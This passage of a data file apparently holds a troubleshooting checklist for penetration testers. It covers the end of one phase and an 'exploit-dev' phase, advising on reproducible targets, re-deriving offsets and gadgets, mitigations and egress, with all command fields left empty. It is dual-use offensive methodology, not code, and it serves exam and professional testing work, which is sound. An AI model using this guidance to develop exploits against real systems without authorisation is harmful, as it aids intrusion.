     "why": "Reconstructing the path afterwards costs far more than writing it down now, and the report needs every step with evidence.",
     "cmd": ""
    },
    {
     "text": "Rotate to another target and come back in an hour.",
     "why": "The blocker at this stage is your own model of the network, and it does not update while you keep staring at it.",
     "cmd": ""
    }
   ]
  },
  {
   "focus": "mixed",
   "phase": "exploit-dev",
   "items": [
    {
     "text": "Can you reproduce the behaviour reliably? If it is intermittent, stop and fix that first.",
     "why": "Debugging an intermittent bug means every experiment has an unknown control, and you will draw wrong conclusions for hours.",
     "cmd": ""
    },
    {
     "text": "Bisect: which is the FIRST step that does not do what you think? Assert at every stage.",
     "why": "People debug the end of a chain when the divergence happened at step two.",
     "cmd": ""
    },
    {
     "text": "Is your test environment identical to the target — version, architecture, OS build, patch level, configuration?",
     "why": "A near-match is a hard fail for anything offset- or parser-dependent, and the error never says so.",
     "cmd": ""
    },
    {
     "text": "Is the target state dirty from previous runs? Reset and re-test.",
     "why": "'Worked once, never again' is a state problem nine times out of ten, and it is the failure mode that ruins exam attempts.",
     "cmd": ""
    },
    {
     "text": "Re-derive offsets, gadgets and bad characters on the target build instead of reusing yesterday's numbers.",
     "why": "Rebasing, patching and ASLR quietly invalidate values that were correct this morning.",
     "cmd": ""
    },
    {
     "text": "Is a mitigation in the way, or is your exploit simply wrong? Confirm in a debugger before blaming DEP/ASLR/CFG.",
     "why": "Assuming a mitigation is the reason sends you down a week-long path when the real problem was an off-by-one.",
     "cmd": ""
    },
    {
     "text": "Are you inferring success from a status code or the absence of an error? Log and assert on a real marker.",
     "why": "Silent partial success is the most expensive kind of false positive in exploit development.",
     "cmd": ""
    },
    {
     "text": "Does it need egress you do not have? Make it in-band.",
     "why": "An out-of-band-only exploit is useless against a filtered target, and that is most real targets.",
     "cmd": ""
    },
    {
     "text": "Add waits and polling for anything asynchronous rather than retry loops.",
     "why": "Retrying a one-shot token or a queued job makes the state worse rather than the timing better.",
     "cmd": ""
    },
    {
     "text": "Is there a shorter path to the same objective that does not need this exploit at all?",
     "why": "The memory-corruption rabbit hole routinely bypasses a far simpler intended bug sitting in plain sight.",
     "cmd": ""
    },
    {
     "text": "Save a known-working copy before you improve it.",
     "why": "Re-deriving an exploit you had working an hour ago is the single most expensive mistake available to you.",
     "cmd": ""
    },
    {
     "text": "Does it run unattended, end to end, from a clean snapshot, with one command?",
     "why": "That is what gets graded and what gets handed to a client — a chain you have to nurse by hand does not count.",
     "cmd": ""
    }
   ]
  }
 ]
};
